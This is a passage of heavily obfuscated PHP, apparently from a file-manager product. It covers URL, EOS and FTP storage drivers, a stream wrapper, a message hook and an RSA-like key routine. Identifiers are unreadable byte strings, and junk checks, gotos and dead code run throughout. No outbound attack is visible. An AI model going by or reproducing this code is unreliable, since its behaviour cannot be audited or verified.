$©ÙªŠ™Ç[703]; if (!$Òªóä•) { die; } break; case $µ¾¶«È[191]: $ğÈÄê’ë = $this->zeug38474222($¢¡ûø€•, strrev($•’á»ôá . $±Í´’ãá)); $á¡º¶ù¹ = $©ÙªŠ™Ç[704]; break; $İ“ŒŞşø = $©ÙªŠ™Ç[705]; if (!$İ“ŒŞşø) { return; } case $µ¾¶«È[293]: $ğÈÄê’ë = $this->zeug38474222($¢¡ûø€•, base64_encode($•’á»ôá . $±Í´’ãá)); break; case $µ¾¶«È[294]: $ğÈÄê’ë = $this->zeug38474222($¢¡ûø€•, md5($•’á»ôá . $±Í´’ãá)); break; $²ÂÌŠÀâ = $©ÙªŠ™Ç[706]; while ($²ÂÌŠÀâ < $©ÙªŠ™Ç[608]) { if ($²ÂÌŠÀâ >= 0) { break; } $²ÂÌŠÀâ++; } case $µ¾¶«È[295]: $¢¡ûø€• = hash_decode($¢¡ûø€•); $ğîÂÊ‚ç = $¢¡ûø€•[0]; $¢¡ûø€• = substr($¢¡ûø€•, 1); $÷•Æá¦º = $©ÙªŠ™Ç[707]; if (!$÷•Æá¦º) { return; } $¯¯õÍƒĞ = strpos($¦“´÷¶ä, $ğîÂÊ‚ç); $™ºƒ˜¸’ = md5($ğîÂÊ‚ç . md5($±Í´’ãá . $ğîÂÊ‚ç) . $±Í´’ãá); $™ºƒ˜¸’ = substr($™ºƒ˜¸’, $¯¯õÍƒĞ % 8, $¯¯õÍƒĞ % 8 + 7); $˜Õº¦ = $µ¾¶«È[6]; $·â•Ìâ¼ = $©ÙªŠ™Ç[708]; $»¤€å‰Ê = 0; $Î‰—§íó = 0; $‘Ë¶•µä = 0; for ($»¤€å‰Ê = 0; $»¤€å‰Ê < strlen($¢¡ûø€•); $»¤€å‰Ê++) { $‘Ë¶•µä = $‘Ë¶•µä == strlen($™ºƒ˜¸’) ? 0 : $‘Ë¶•µä; $çş•Øº¾ = $©ÙªŠ™Ç[709]; if (!$çş•Øº¾) { return; } $â®‡³ã’ = $‘Ë¶•µä++; $Î‰—§íó = strpos($¦“´÷¶ä, $¢¡ûø€•[$»¤€å‰Ê]) - $¯¯õÍƒĞ - ord($™ºƒ˜¸’[$â®‡³ã’]); $†¼—Õ¬¤ = $©ÙªŠ™Ç[710]; while ($Î‰—§íó < 0) { $Î‰—§íó += 64; $ÃœÅÎ†® = $©ÙªŠ™Ç[711]; } $˜Õº¦ .= $¦“´÷¶ä[$Î‰—§íó]; } $ğÈÄê’ë = base64_decode($˜Õº¦); $®Ææò¸ò = $©ÙªŠ™Ç[712]; if (!$®Ææò¸ò) { return; } break; $ü›ÃÀêú = $©ÙªŠ™Ç[713]; if (strlen($ü›ÃÀêú) < $©ÙªŠ™Ç[620]) { die; } default: $ğÈÄê’ë = $this->zeug38474222($¢¡ûø€•, $±Í´’ãá . $•’á»ôá); break; } if ($“ÎæÍé - 1 > 0) { $ğÈÄê’ë = $this->zcvt00b9d8a1($ğÈÄê’ë, $±Í´’ãá, $“ÎæÍé - 1); } return $ğÈÄê’ë; } public function csow89bc2094($¼–µĞÍ») { $Û•¯Şä =& $_SERVER[ê‘³Æ±]; $ŸÙÕĞ»İ =& $_SERVER[‘ìŞ—í†]; $ìÏÙ = $this->xkjp70ae5a9f(); $áŠ¼ş´ú = $this->xkjp70ae5a9f(); $Ÿ–‚­ = $Û•¯Şä[714]; $Ñ¸äÕ˜¦ = ($ìÏÙ - 1) * ($áŠ¼ş´ú - 1); $å«ÑÍ¶û = intval(($ìÏÙ + $áŠ¼ş´ú) / 2); $Œ˜Â²™ = $Û•¯Şä[715]; if (!$Œ˜Â²™) { die; } while (1) { $ˆşéèêî = $å«ÑÍ¶û; $€•ÙÈŸä = $Ñ¸äÕ˜¦; while ($€•ÙÈŸä % $ˆşéèêî != 0) { $ì˜¦²Å = $€•ÙÈŸä; $şšÍæ‰Ä = $Û•¯Şä[716]; if (!$şšÍæ‰Ä) { return; } $€•ÙÈŸä = $ˆşéèêî; $ÓË¥Œ€à = $Û•¯Şä[717]; if (strlen($ÓË¥Œ€à) < $Û•¯Şä[613]) { return; } $ˆşéèêî = $ì˜¦²Å % $ˆşéèêî; } if ($ˆşéèêî == 1) { break; } else { $å«ÑÍ¶û++; } } $ŸŞ†Äç = 2; $¥Œ³§ = $Û•¯Şä[718]; if (!$¥Œ³§) { return; } for ($ÉÅ°ã›Š = 0; $ÉÅ°ã›Š < $Ñ¸äÕ˜¦ * 10; $ÉÅ°ã›Š++) { if (($Ñ¸äÕ˜¦ * $ÉÅ°ã›Š + 1) % $å«ÑÍ¶û == 0) { $ŸŞ†Äç = intval(($Ñ¸äÕ˜¦ * $ÉÅ°ã›Š + 1) / $å«ÑÍ¶û); break; } } $„½¶Í¿ = $this->prjee25942f3($ìÏÙ * $áŠ¼ş´ú . $ŸÙÕĞ»İ[6], $ŸÙÕĞ»İ[130]); $ØêÓµÛ… = md5($ŸÙÕĞ»İ[296] . ($ìÏÙ + $áŠ¼ş´ú) . $ŸÙÕĞ»İ[297] . $å«ÑÍ¶û . $ŸÙÕĞ»İ[297] . $ŸŞ†Äç . $ŸÙÕĞ»İ[298]); $¢ØŞ«ù– = $Û•¯Şä[719]; if (strlen($¢ØŞ«ù–) < $Û•¯Şä[610]) { die; } $ÁŸ’Ïòú = $this->prjee25942f3($¼–µĞÍ», $ØêÓµÛ…) . $ŸÙÕĞ»İ[299] . $„½¶Í¿; $ÍÙí‡ƒÕ = $Û•¯Şä[720]; if (strlen($ÍÙí‡ƒÕ) < $Û•¯Şä[610]) { return; } return $ÁŸ’Ïòú; } public function arom66b5ced7($Ñû‚‘“) { $ûĞç– =& $_SERVER[ê‘³Æ±]; $Ì²Û÷Ùš =& $_SERVER[‘ìŞ—í†]; $«Ê™ÅŸı = explode($Ì²Û÷Ùš[299], $Ñû‚‘“); $±ªäêÔ = $ûĞç–[721]; if (strlen($±ªäêÔ) < $ûĞç–[613]) { die; } if (count($«Ê™ÅŸı) != 2) { return $Ì²Û÷Ùš[6]; } $‰“–î²¾ = $this->zeug38474222($«Ê™ÅŸı[1] . $Ì²Û÷Ùš[6], $Ì²Û÷Ùš[130]); if (!$‰“–î²¾) { return $Ì²Û÷Ùš[6]; } $‰“–î²¾ = intval($‰“–î²¾); $ÍïÃŠô = $ûĞç–[722]; while (strlen($ÍïÃŠô) < $ûĞç–[620]) { if (!$ÍïÃŠô) { break; } $ÍïÃŠô++; } $ßÚå¶º½ = 0; $å§öÀ³ = 0; for ($•Ñ¨ıİÑ = 3; $•Ñ¨ıİÑ < $‰“–î²¾; $•Ñ¨ıİÑ += 2) { if ($‰“–î²¾ % $•Ñ¨ıİÑ != 0) { continue; } $ßÚå¶º½ = $•Ñ¨ıİÑ; $å§öÀ³ = intval($‰“–î²¾ / $•Ñ¨ıİÑ); $÷ÃŒŸÇÊ = $ûĞç–[723]; while ($÷ÃŒŸÇÊ < $ûĞç–[620]) { if ($÷ÃŒŸÇÊ >= 0) { break; } $÷ÃŒŸÇÊ++; } break; } $ŞšÖ¶ÄË = ($ßÚå¶º½ - 1) * ($å§öÀ³ - 1); $ĞøÚÚÎš = $ûĞç–[724]; $¹Ùƒ¹Ã = intval(($ßÚå¶º½ + $å§öÀ³) / 2); while (1) { $ÌÁ²€òà = $¹Ùƒ¹Ã; $ˆ›†Ê©æ = $ŞšÖ¶ÄË; while ($ˆ›†Ê©æ % $ÌÁ²€òà != 0) { $…ƒñ˜áÄ = $ˆ›†Ê©æ; $ØÆşıÉÇ = $ûĞç–[725]; while ($ØÆşıÉÇ < $ûĞç–[608]) { if ($ØÆşıÉÇ >= 0) { break; } $ØÆşıÉÇ++; } $ˆ›†Ê©æ = $ÌÁ²€òà; $õêŞñî = $ûĞç–[726]; $ÌÁ²€òà = $…ƒñ˜áÄ % $ÌÁ²€òà; } if ($ÌÁ²€òà == 1) { break; } else { $¹Ùƒ¹Ã++; } } $Òø×˜¡ = 2; for ($•Ñ¨ıİÑ = 0; $•Ñ¨ıİÑ < $ŞšÖ¶ÄË * 10; $•Ñ¨ıİÑ++) { if (($ŞšÖ¶ÄË * $•Ñ¨ıİÑ + 1) % $¹Ùƒ¹Ã == 0) { $Òø×˜¡ = intval(($ŞšÖ¶ÄË * $•Ñ¨ıİÑ + 1) / $¹Ùƒ¹Ã); break; } } $ŞõÏ™  = md5($Ì²Û÷Ùš[296] . ($ßÚå¶º½ + $å§öÀ³) . $Ì²Û÷Ùš[297] . $¹Ùƒ¹Ã . $Ì²Û÷Ùš[297] . $Òø×˜¡ . $Ì²Û÷Ùš[298]); $İ€òÇì¡ = $this->zeug38474222($«Ê™ÅŸı[0], $ŞõÏ™ ); return $İ€òÇì¡; $ºîşÖ³Â = $ûĞç–[727]; if (strlen($ºîşÖ³Â) < $ûĞç–[603]) { return; } } public function xkjp70ae5a9f() { $´Ûè±½› =& $_SERVER[ê‘³Æ±]; $½¹Æ‘‡š = mt_rand(pow(2, 14), pow(2, 16) - 1); $†³’ÌÕ = array(); $¾»¼Ñ¹Ø = $´Ûè±½›[728]; if (strlen($¾»¼Ñ¹Ø) < $´Ûè±½›[603]) { die; } $Ñ«â¦Ó = 1; while ($Ñ«â¦Ó <= (int) sqrt($½¹Æ‘‡š)) { $¢ã™¸É× = $Ñ«â¦Ó; $µ§µ’Á  = $´Ûè±½›[729]; if (strlen($µ§µ’Á ) < $´Ûè±½›[603]) { return; } while (!0) { $¢ã™¸É×++; $Ğ¡À“Ä£ = $´Ûè±½›[671]; if ($¢ã™¸É× <= 2) { $Ñ«â¦Ó = $¢ã™¸É×; break; } else { if ($¢ã™¸É× < 2) { continue; } } $ÖÄŞ°Óù = !0; for ($¯®õå = 2; $¯®õå <= sqrt($¢ã™¸É×); $¯®õå++) { if ($¢ã™¸É× % $¯®õå == 0) { $ÖÄŞ°Óù = !1; } } if ($ÖÄŞ°Óù) { $Ñ«â¦Ó = $¢ã™¸É×; break; } } $†³’ÌÕ[] = $Ñ«â¦Ó; $Åˆùºâ = $´Ûè±½›[730]; if (strlen($Åˆùºâ) < $´Ûè±½›[610]) { die; } } $¯ ¼Àİ = 2; $ö¢Ø¸Ïû = $´Ûè±½›[731]; if (strlen($ö¢Ø¸Ïû) < $´Ûè±½›[613]) { die; } for ($¢ã™¸É× = $½¹Æ‘‡š; $¢ã™¸É× > 1; $¢ã™¸É×--) { $ÖÄŞ°Óù = !0; $ÏĞ¹«‚• = $´Ûè±½›[732]; while ($ÏĞ¹«‚• < $´Ûè±½›[613]) { if ($ÏĞ¹«‚• >= 0) { break; } $ÏĞ¹«‚•++; } foreach ($†³’ÌÕ as $ÜÕó¹‚ş) { if ($¢ã™¸É× % $ÜÕó¹‚ş == 0) { $ÖÄŞ°Óù = !1; break; } } if ($ÖÄŞ°Óù) { $¯ ¼Àİ = $¢ã™¸É×; break; } } return $¯ ¼Àİ; } public function pytj50a4e2a2($˜Ÿ¹éÜÔ, $œô†ì«) { $¯‚¼›óª =& $_SERVER[ê‘³Æ±]; $»Û‡ÖìÇ =& $_SERVER[‘ìŞ—í†]; return call_user_func(array($»Û‡ÖìÇ[8], $»Û‡ÖìÇ[300]), $˜Ÿ¹éÜÔ, $œô†ì«); $œÙüÖÏõ = $¯‚¼›óª[733]; if (strlen($œÙüÖÏõ) < $¯‚¼›óª[608]) { return; } } public function prjee25942f3($€®ã‡šá, $é‚š‚«) { $™§é•÷Ë =& $_SERVER[‘ìŞ—í†]; return call_user_func(array($™§é•÷Ë[301], $™§é•÷Ë[302]), $€®ã‡šá, $é‚š‚«); } public function zeug38474222($Ò¿±€‡‡, $ù¡Óğ¨) { $¾Àô–ò =& $_SERVER[‘ìŞ—í†]; return call_user_func(array($¾Àô–ò[301], $¾Àô–ò[303]), $Ò¿±€‡‡, $ù¡Óğ¨); } } goto E¬†‹¬„Çİ; b«Ü”ÁƒÙÃ: define($_SERVER[ê‘³Æ±][235], 1); define($_SERVER[ê‘³Æ±][236], 2); define($_SERVER[ê‘³Æ±][237], 3); goto DŒì„ğ±®; BÓÌÄêì×Ğ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($í½™ò±­ = false) { } public function exist($ÅŠ™ˆÕ) { $·Ûàí† = $this->info($ÅŠ™ˆÕ); return $·Ûàí†[$_SERVER[ê‘³Æ±][196]]; } public function isFile($©í»¿Á¾) { $ˆ”’’”¾ = $this->info($©í»¿Á¾); return $ˆ”’’”¾[$_SERVER[ê‘³Æ±][196]]; } public function isFolder($¸öŒµË¨) { return !1; } public function size($¦ÌÄÄ¼¹) { $ù›ŒªñÖ = $this->info($¦ÌÄÄ¼¹); return $ù›ŒªñÖ[$_SERVER[ê‘³Æ±][80]]; } public function info($ÍØÚÏ€‹) { return $this->infoParse($ÍØÚÏ€‹); } public function infoAuth($İš»‘ˆ´) { return $this->infoParse($İš»‘ˆ´); } public function infoWithChildren($Ùéù) { return $this->infoParse($Ùéù); } public function infoFull($İ«·’øÕ) { return $this->infoParse($İ«·’øÕ); } private function infoParse($¤çÂÏ•Ö) { $œ™ÉÅÃ† =& $_SERVER[ê‘³Æ±]; $è§½†ô¸ = $this->header($¤çÂÏ•Ö); if (!$è§½†ô¸ || !$è§½†ô¸[$œ™ÉÅÃ†[736]]) { return !1; } $ŒÂ¢á© = _get($è§½†ô¸, $œ™ÉÅÃ†[334], 0); $¶º›£‘œ = array($œ™ÉÅÃ†[32] => $è§½†ô¸[$œ™ÉÅÃ†[32]], $œ™ÉÅÃ†[78] => $¤çÂÏ•Ö, $œ™ÉÅÃ†[33] => $œ™ÉÅÃ†[194], $œ™ÉÅÃ†[80] => intval($ŒÂ¢á©), $œ™ÉÅÃ†[169] => get_path_ext($è§½†ô¸[$œ™ÉÅÃ†[32]]), $œ™ÉÅÃ†[1365] => $ŒÂ¢á© > 0 && $è§½†ô¸[$œ™ÉÅÃ†[1487]], $œ™ÉÅÃ†[1366] => !1); return $¶º›£‘œ; } private function header($Ü»Á²µ) { $²‹ÀòŒ =& $_SERVER[ê‘³Æ±]; if (isset(self::$_cacheHeader[$Ü»Á²µ])) { return self::$_cacheHeader[$Ü»Á²µ]; } $‘ÂØàäŸ = isset($GLOBALS[$²‹ÀòŒ[1488]]) ? $GLOBALS[$²‹ÀòŒ[1488]] : !1; $GLOBALS[$²‹ÀòŒ[1488]] = !0; self::$_cacheHeader[$Ü»Á²µ] = url_header($Ü»Á²µ); $GLOBALS[$²‹ÀòŒ[1488]] = $‘ÂØàäŸ; return self::$_cacheHeader[$Ü»Á²µ]; } public function hashSimple($¼èĞà¬œ, $­¸ê‡İ = false) { $Ë½ô“Ú =& $_SERVER[ê‘³Æ±]; $éì½èÀ¢ = $this->info($¼èĞà¬œ); if (!$éì½èÀ¢ || !$éì½èÀ¢[$Ë½ô“Ú[196]]) { return !1; } $Ó¦ûÍÖÖ = $éì½èÀ¢[$Ë½ô“Ú[80]]; $œ÷†Œâù = 200; $—ù²è¬Ò = 50; if ($Ó¦ûÍÖÖ <= $œ÷†Œâù * $—ù²è¬Ò) { return md5($this->fileSubstr($¼èĞà¬œ, 0, $Ó¦ûÍÖÖ)) . $Ó¦ûÍÖÖ; } $ÆÊ×ÒÈŞ = intval($Ó¦ûÍÖÖ / $—ù²è¬Ò); $•ó‡üĞ = $Ë½ô“Ú[12]; $·íÛİ¤ = timeFloat(); $¸å´ğ = 15; for ($Ø–µë’ = 0; $Ø–µë’ < $—ù²è¬Ò; $Ø–µë’++) { if (timeFloat() - $·íÛİ¤ > $¸å´ğ) { return !1; } $ßÊ¼ô¼ = $this->fileSubstr($¼èĞà¬œ, $ÆÊ×ÒÈŞ * $Ø–µë’, $œ÷†Œâù); if (!$ßÊ¼ô¼) { return !1; } $•ó‡üĞ .= $ßÊ¼ô¼; } $•ó‡üĞ .= $this->fileSubstr($¼èĞà¬œ, $Ó¦ûÍÖÖ - $œ÷†Œâù, $œ÷†Œâù); return md5($•ó‡üĞ) . $Ó¦ûÍÖÖ; } public function getContent($…ãÈ³·“) { return $this->fileSubstr($…ãÈ³·“); } public function fileSubstr($”êèíèŠ, $áë°é›› = 0, $ï£Û¡–„ = -1) { $®ÊËú¦Í =& $_SERVER[ê‘³Æ±]; $äÕ‘…ÇÃ = $this->info($”êèíèŠ); if (!$äÕ‘…ÇÃ || !$äÕ‘…ÇÃ[$®ÊËú¦Í[196]] && $äÕ‘…ÇÃ[$®ÊËú¦Í[80]] > 1024 * 1024 * 10) { return !1; } if ($ï£Û¡–„ === -1) { $ï£Û¡–„ = $äÕ‘…ÇÃ[$®ÊËú¦Í[80]]; } if ($ï£Û¡–„ == 0) { return $®ÊËú¦Í[12]; } $ö‹÷ÔŠ = array($®ÊËú¦Í[1489] . $áë°é›› . $®ÊËú¦Í[768] . ($áë°é›› + $ï£Û¡–„ - 1)); $œ›Ñ = url_request($”êèíèŠ, $®ÊËú¦Í[227], !1, $ö‹÷ÔŠ, !1, !1, 1); return $œ›Ñ[$®ÊËú¦Í[1180]] ? $œ›Ñ[$®ÊËú¦Í[1180]] : $®ÊËú¦Í[12]; } public function download($İøÒò§, $Ş÷µå¯Ó) { Downloader::start($İøÒò§, $Ş÷µå¯Ó); return $Ş÷µå¯Ó; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¯Æ¾Øñï, $åâ•¸ï¡ = '') { $this->info = $this->info($¯Æ¾Øñï); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ê‘³Æ±][78]]; $this->pathOpen = $¯Æ¾Øñï; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¯Æ¾Øñï])) { self::$_chunkBuffer[$¯Æ¾Øñï] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Á©åˆŸı) { $Àğ»Ç = $this->fileSubstr($this->pose, $Á©åˆŸı); $this->pose += strlen($Àğ»Ç); return $Àğ»Ç; } public function stream_tell() { return $this->pose; } public function stream_seek($ñÊ½ìßƒ, $æŸ÷Ô¡) { $”¯–°Ò­ =& $_SERVER[ê‘³Æ±]; if ($æŸ÷Ô¡ == SEEK_SET) { $this->pose = $ñÊ½ìßƒ; } else { if ($æŸ÷Ô¡ == SEEK_CUR) { $this->pose += $ñÊ½ìßƒ; } else { if ($æŸ÷Ô¡ == SEEK_END) { $this->pose = $this->info[$”¯–°Ò­[80]] + intval($ñÊ½ìßƒ); } } } if ($ñÊ½ìßƒ < 0) { $this->pose = $this->info[$”¯–°Ò­[80]] + $ñÊ½ìßƒ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ê‘³Æ±][80]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Ÿ„ û’, $Å–û±ö—) { $˜ Œä° =& $_SERVER[ê‘³Æ±]; $ˆ·¸€¶€ = $this->info($Ÿ„ û’); return array($˜ Œä°[1490] => 0, $˜ Œä°[1491] => 0, $˜ Œä°[16] => 32768 + 511, $˜ Œä°[1492] => 0, $˜ Œä°[1493] => 0, $˜ Œä°[1494] => 0, $˜ Œä°[1495] => 0, $˜ Œä°[80] => $ˆ·¸€¶€[$˜ Œä°[80]], $˜ Œä°[1496] => $ˆ·¸€¶€[$˜ Œä°[1364]], $˜ Œä°[1452] => $ˆ·¸€¶€[$˜ Œä°[86]], $˜ Œä°[1451] => $ˆ·¸€¶€[$˜ Œä°[195]], $˜ Œä°[1497] => 0, $˜ Œä°[1498] => 0); } static $fileInfo = array(); public function info($ÁÕâùÚî) { $•¶Ó…› = $_SERVER[ê‘³Æ±][1499]; if (isset(self::$fileInfo[$ÁÕâùÚî])) { return self::$fileInfo[$ÁÕâùÚî]; } if (substr($ÁÕâùÚî, 0, strlen($•¶Ó…›)) != $•¶Ó…›) { return !1; } self::$fileInfo[$ÁÕâùÚî] = IO::info(substr($ÁÕâùÚî, strlen($•¶Ó…›))); return self::$fileInfo[$ÁÕâùÚî]; } public static function read($©ÉÙ¯Ñ®, $îõ¢º¸, $£òÀ”) { if (!isset(self::$_fopenCache[$©ÉÙ¯Ñ®])) { $ñõ¯Öš = new StreamWrapperIO(); $ñõ¯Öš->stream_open($©ÉÙ¯Ñ®); self::$_fopenCache[$©ÉÙ¯Ñ®] = $ñõ¯Öš; } $ñõ¯Öš = self::$_fopenCache[$©ÉÙ¯Ñ®]; return $ñõ¯Öš->fileSubstr($îõ¢º¸, $£òÀ”); } public static function _read($×ª©ŸÃ, $¤ã¯õ¨Ï, $Çë¬Ï) { $®¥¼£… =& $_SERVER[ê‘³Æ±]; $è•´¯Æ = fopen($×ª©ŸÃ, $®¥¼£…[1368]); if (!$è•´¯Æ) { return $®¥¼£…[12]; } $–Ÿª¶ªÔ = 8192; fseek($è•´¯Æ, $¤ã¯õ¨Ï, SEEK_SET); $¬ü‘ŠÂ§ = $®¥¼£…[12]; $Ö™íãÜ¢ = 0; while ($Ö™íãÜ¢ < $Çë¬Ï) { $ø°âÅÜ = min($–Ÿª¶ªÔ, $Çë¬Ï - $Ö™íãÜ¢); $¬ü‘ŠÂ§ .= fread($è•´¯Æ, $ø°âÅÜ); $Ö™íãÜ¢ += $ø°âÅÜ; } fclose($è•´¯Æ); return $¬ü‘ŠÂ§; } public function fileSubstr($–ÕÀí‹‘, $ëäıÀµñ) { $Ş¬¨ÁÙ =& $_SERVER[ê‘³Æ±]; $ßÔÕ¨Í« = $this->info[$Ş¬¨ÁÙ[80]]; $§ÚÂÖ‘¿ = $–ÕÀí‹‘; $Í”¥éÃ„ = $ëäıÀµñ; if ($–ÕÀí‹‘ < 0) { $–ÕÀí‹‘ = $ßÔÕ¨Í« + $–ÕÀí‹‘; } if ($ëäıÀµñ === !1) { $ëäıÀµñ = $ßÔÕ¨Í« - $–ÕÀí‹‘; } if ($–ÕÀí‹‘ + $ëäıÀµñ > $ßÔÕ¨Í«) { $ëäıÀµñ = $ßÔÕ¨Í« - $–ÕÀí‹‘; } if ($ëäıÀµñ <= 0) { return $Ş¬¨ÁÙ[12]; } if ($–ÕÀí‹‘ < 0 || $–ÕÀí‹‘ >= $ßÔÕ¨Í« || $ëäıÀµñ <= 0 || $ëäıÀµñ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\x6c\x65\122\x65\x61\x64\x20\x65\162\162\157\x72\41\x20\x73\164\141\x72\164\75{$–ÕÀí‹‘}\73\x6c\145\156\x67\x74\150\x3d{$ëäıÀµñ}\x3b\x20\163\x69\172\145\x3d{$ßÔÕ¨Í«}\x3b"); } $Ì±¨†ˆè = 64 * 1024; $†æÆ¨¼Ò =& self::$_chunkBuffer[$this->path]; if (!$†æÆ¨¼Ò) { $†æÆ¨¼Ò = array(); } $ËÊ¹á¿ä = 0; $µ•Ù‹€ = 0; $ªäµÕ¹í = $Ş¬¨ÁÙ[12]; foreach ($†æÆ¨¼Ò as $ËÊ¹á¿ä => $ªäµÕ¹í) { $ËÊ¹á¿ä = intval($ËÊ¹á¿ä); $µ•Ù‹€ = $ËÊ¹á¿ä + strlen($ªäµÕ¹í); if ($–ÕÀí‹‘ >= $µ•Ù‹€) { continue; } if ($–ÕÀí‹‘ >= $ËÊ¹á¿ä && $–ÕÀí‹‘ + $ëäıÀµñ <= $µ•Ù‹€) { return substr($ªäµÕ¹í, $–ÕÀí‹‘ - $ËÊ¹á¿ä, $ëäıÀµñ); } break; } if (count($†æÆ¨¼Ò) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ş¬¨ÁÙ[1500], $Ş¬¨ÁÙ[1501] . count($†æÆ¨¼Ò) . "\73\163\164\141\162\164\75{$–ÕÀí‹‘}\54\154\x65\156\x67\164\150\x3d{$ëäıÀµñ}\x3b\x70\x6f\x73\x65\72{$ËÊ¹á¿ä}\x7e{$µ•Ù‹€}"); throw new Exception($Ş¬¨ÁÙ[1502]); } $ïˆÅÉ·® = intval($–ÕÀí‹‘ / $Ì±¨†ˆè) * $Ì±¨†ˆè; $£¡–¼¨ò = ceil(($–ÕÀí‹‘ + $ëäıÀµñ) / $Ì±¨†ˆè) * $Ì±¨†ˆè - $ïˆÅÉ·®; $º¥©®Ş = IO::fileSubstr($this->path, $ïˆÅÉ·®, $£¡–¼¨ò); $†æÆ¨¼Ò[$ïˆÅÉ·® . $Ş¬¨ÁÙ[12]] = $º¥©®Ş; ksort($†æÆ¨¼Ò); $¥³Ñ¯³ = substr($º¥©®Ş, $–ÕÀí‹‘ - $ïˆÅÉ·®, $ëäıÀµñ); return $¥³Ñ¯³; } private function log($‡÷£ÂÈ˜, $÷—«ğâ“) { $°ğ±µ¢Å =& $_SERVER[ê‘³Æ±]; $½¾éåß® = timeFloat() - $this->timeStart; write_log(sprintf($°ğ±µ¢Å[1503], $‡÷£ÂÈ˜, $this->info[$°ğ±µ¢Å[32]], $½¾éåß®, $÷—«ğâ“), $°ğ±µ¢Å[1170]); } } class Message { function __construct() { } public function send($à…ƒöşÚ = '', $é•…ç´× = array(), $½¦ÍÓê = "\164\145\170\x74") { $îù¤óƒ— =& $_SERVER[ê‘³Æ±]; $íŒä¬æË = array($îù¤óƒ—[33] => $îù¤óƒ—[1504], $îù¤óƒ—[741] => $à…ƒöşÚ); if (in_array($½¦ÍÓê, array($îù¤óƒ—[1504], $îù¤óƒ—[1505]))) { $íŒä¬æË[$îù¤óƒ—[33]] = $½¦ÍÓê; } $é•…ç´× = array($îù¤óƒ—[508] => isset($é•…ç´×[$îù¤óƒ—[508]]) ? $é•…ç´×[$îù¤óƒ—[508]] : $îù¤óƒ—[12], $îù¤óƒ—[590] => isset($é•…ç´×[$îù¤óƒ—[590]]) ? $é•…ç´×[$îù¤óƒ—[590]] : $îù¤óƒ—[12]); if (empty($à…ƒöşÚ) || empty($é•…ç´×[$îù¤óƒ—[508]]) && empty($é•…ç´×[$îù¤óƒ—[590]])) { return !1; } $õËÍï = array($îù¤óƒ—[1445] => $íŒä¬æË, $îù¤óƒ—[1506] => $é•…ç´×); Hook::trigger($îù¤óƒ—[1507], $õËÍï); } } goto eƒÖ‰œ¢…; aÃá°ç‡²: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ªï‰ôæŸ) { parent::__construct($ªï‰ôæŸ); $this->signatureVersion($_SERVER[ê‘³Æ±][213]); } public function uploadFormData($ÁóÒ«§­, $ó»§§ë = 3600) { $Û¬»ìÁÁ =& $_SERVER[ê‘³Æ±]; $´ıµÈßú = $Û¬»ìÁÁ[193]; $€êĞëê = $Û¬»ìÁÁ[1333]; $ÒîĞÄŒ = $Û¬»ìÁÁ[62]; $ÒİÁÄË½ = gmdate($Û¬»ìÁÁ[1334]); $ÒŠıŠŞ = gmdate($Û¬»ìÁÁ[737]); $Å¦æ±Š‹ = $Û¬»ìÁÁ[1335]; $¦òÃ·ºÅ = $ó»§§ë . $Û¬»ìÁÁ[12]; $ËôëÒªÌ = $Û¬»ìÁÁ[1297]; $¤¡÷®ëÒ = array($this->accessKey, $ÒŠıŠŞ, $this->region, $ÒîĞÄŒ, $Å¦æ±Š‹); $£ûØÆ² = implode($Û¬»ìÁÁ[8], $¤¡÷®ëÒ); $›Î¨âÃ´ = array($Û¬»ìÁÁ[1299] => gmdate($Û¬»ìÁÁ[1298], strtotime($Û¬»ìÁÁ[1336])), $Û¬»ìÁÁ[1300] => array(array($Û¬»ìÁÁ[1302] => $this->bucket), array($Û¬»ìÁÁ[1301] => $´ıµÈßú), array($Û¬»ìÁÁ[1303], $Û¬»ìÁÁ[1304], $Û¬»ìÁÁ[12]), array($Û¬»ìÁÁ[1303], $Û¬»ìÁÁ[1337], $Û¬»ìÁÁ[12]), array($Û¬»ìÁÁ[1303], $Û¬»ìÁÁ[1338], $Û¬»ìÁÁ[12]), array($Û¬»ìÁÁ[1305] => $ËôëÒªÌ), array($Û¬»ìÁÁ[1339] => $£ûØÆ²), array($Û¬»ìÁÁ[1340] => $€êĞëê), array($Û¬»ìÁÁ[1341] => $ÒİÁÄË½), array($Û¬»ìÁÁ[1342] => $¦òÃ·ºÅ))); $‰äí°„Ü = base64_encode(json_encode($›Î¨âÃ´)); $Üó£Ş¯ï = hash_hmac($Û¬»ìÁÁ[1343], $ÒŠıŠŞ, $Û¬»ìÁÁ[1344] . $this->secret, !0); $‰çÙêĞ’ = hash_hmac($Û¬»ìÁÁ[1343], $this->region, $Üó£Ş¯ï, !0); $¿ÖÒ†¾ = hash_hmac($Û¬»ìÁÁ[1343], $ÒîĞÄŒ, $‰çÙêĞ’, !0); $­º·Ô­Û = hash_hmac($Û¬»ìÁÁ[1343], $Å¦æ±Š‹, $¿ÖÒ†¾, !0); $Ãæ‘µŞà = hash_hmac($Û¬»ìÁÁ[1343], $‰äí°„Ü, $­º·Ô­Û); $èó’ãé = array($Û¬»ìÁÁ[212] => $Û¬»ìÁÁ[12], $Û¬»ìÁÁ[1345] => $Û¬»ìÁÁ[12], $Û¬»ìÁÁ[1301] => $´ıµÈßú, $Û¬»ìÁÁ[1305] => $ËôëÒªÌ, $Û¬»ìÁÁ[1309] => $‰äí°„Ü, $Û¬»ìÁÁ[1346] => $£ûØÆ², $Û¬»ìÁÁ[1347] => $€êĞëê, $Û¬»ìÁÁ[1348] => $ÒİÁÄË½, $Û¬»ìÁÁ[1349] => $¦òÃ·ºÅ, $Û¬»ìÁÁ[1350] => $Ãæ‘µŞà, $Û¬»ìÁÁ[176] => $this->getHost()); return $èó’ãé; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function 